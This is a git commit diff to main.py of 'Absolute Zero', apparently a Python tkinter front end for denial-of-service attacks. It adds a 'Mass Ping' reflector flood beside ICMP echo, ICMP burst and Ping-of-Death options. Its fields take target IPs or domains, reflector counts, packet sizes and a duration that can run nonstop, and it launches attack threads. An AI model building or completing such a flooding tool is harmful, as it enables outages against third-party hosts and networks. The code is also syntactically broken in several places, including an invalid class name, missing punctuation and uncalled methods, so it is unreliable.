08d5b6a32a5f658dff8e70829546999ad4277c17
X the Mystic <155488884+X-The-Mystic@users.noreply.github.com>
2024-04-17 18:07:03 -0400

    Update main.py

--- main.py
+++ main.py
@@ -15,16 +15,17 @@ class Absolute-Zero:
         self.root = tk.Tk()
         self.root.title("Absolute Zero -X-The-Mystic")
 
-        self.target_text = tk.Text(self.root, height=5, width=30)
-        self.ping_number = tk.Entry(self.root)
-        self.target_port = tk.Entry(self.root)
-        self.packet_size = tk.Entry(self.root)
-        self.attack_duration = tk.Entry(self.root)
+        self.target_text_entry = tk.Text(self.root, height=5, width=30)
+        self.ping_number_entry = tk.Entry(self.root)
+        self.num_packets_entry = tk.Entry(self.root)
+        self.target_port_entry = tk.Entry(self.root)
+        self.packet_size_entry = tk.Entry(self.root)
+        self.attack_duration_entry = tk.Entry(self.root)
         self.attack_vector_entry = tk.StringVar
         self.attack_vector_entry.set("ICMP echo")
 
         self.attack_vectors = [
-            "ICMP echo", "ICMP burst", "PoD Attack"
+            "Mass Ping", "ICMP echo", "ICMP burst", "PoD Attack"
         ]
 
         self.attack_num = 0
@@ -36,19 +37,22 @@ class Absolute-Zero:
 
     def create_gui(self)
         tk.Label(self.root, text="Enter the target's IPv4 address or the website domain name (one per line).").pack()
-        self.target_text.pack()
+        self.target_text_entry.pack()
 
         tk.Label(self.root, text="Enter the number of IP ping reflectors to use.").pack()
-        self.ping_number.pack()
+        self.ping_number_entry.pack()
+
+        tk.Label(self.root, text="Enter the number of packets you would like to send (don't use this for Mass Ping).").pack
+        self.num_packets_entry.pack()
 
         tk.Label(self.root, text="Enter the target's port number.").pack()
-        self.target_port.pack()
+        self.target_port_entry.pack()
 
-        tk.Label(self.root, text="Enter the ICMP response packet size.").pack()
-        self.packet_size.pack()
+        tk.Label(self.root, text="Enter the ICMP response packet size (Mass Ping only).").pack()
+        self.packet_size_entry.pack()
 
         tk.Label(self.root, text="Enter the duration of the ping attack (leave blank if nonstop).").pack
-        self.attack_duration.pack()
+        self.attack_duration_entry.pack()
 
         tk.Label(self.root, text="Select the attack vector you would like to use.").pack
         attack_vector_menu = tk.OptionMenu(self.root, self.attack_vector_entry, *self.attack_vectors)
@@ -67,8 +71,21 @@ class Absolute-Zero:
         tk.Button(self.root, text="Forcequit All" command=self.quit_attack).pack()
 
     def start_attack(self):
-        target_text = self.get_target_text()
-        ping_number = self.
+        target_text = self.get_target_text_entry()
+        ping_number = int(self.ping_number_entry.get())
+        num_packets = int(self.num_packets_entry.get())
+        port = int(self.target_port_entry.get())
+        packet_size = int(self.packet_size_entry.get())
+        attack_duration = float(self.attack_duration_entry.get())
+        attack_vector = self.attack_vector_entry.get()
+
+        if attack_vector == "Mass Ping":
+            attack_thread = threading.Thread(target=self.mass_ping_flood,
+                                             args=(target_text, ping_number, port, packet_size, attack_duration))
+
+        if attack_vector == "ICMP echo":
+            attack_thread = threading.Thread(target=self.icmp_echo_attack,
+                                             args=(target_text, num_packets, port, attack_duration))
         
         
         
